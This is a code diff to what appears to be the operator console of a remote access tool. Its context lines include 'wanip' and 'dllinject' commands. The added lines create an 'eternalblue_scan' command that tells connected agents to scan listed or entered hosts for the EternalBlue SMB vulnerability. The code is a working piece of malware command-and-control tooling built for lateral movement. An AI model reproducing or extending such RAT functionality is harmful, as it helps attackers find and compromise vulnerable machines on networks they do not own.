@@ -679,6 +679,24 @@ Open Ports
                     self.SendData("wanip")
                     self.WaitForReply()
 
+                elif(main == "eternalblue_scan"):
+                    try:
+                        if((len(self.remote_hosts_list)) > 0):
+                            for host in self.remote_hosts_list:
+                                self.SendData("eternal_scan:"+host.split("-")[0].strip())
+                                self.WaitForReply()
+                    except Exception as e:
+                        print("[X] Error : " + str(e))
+
+                elif(main == "eternalblue_scan -h"):
+                    try:
+                        ip = prompt("[?] Enter Host IP : ")
+                        if(len(ip) > 0):
+                            self.SendData("eternal_scan:"+ip)
+                            self.WaitForReply()
+                    except Exception as e:
+                        print("[X] Error : " + str(e))
+                
                 elif(main == "dllinject"):
                     
                     DLLTransfer()
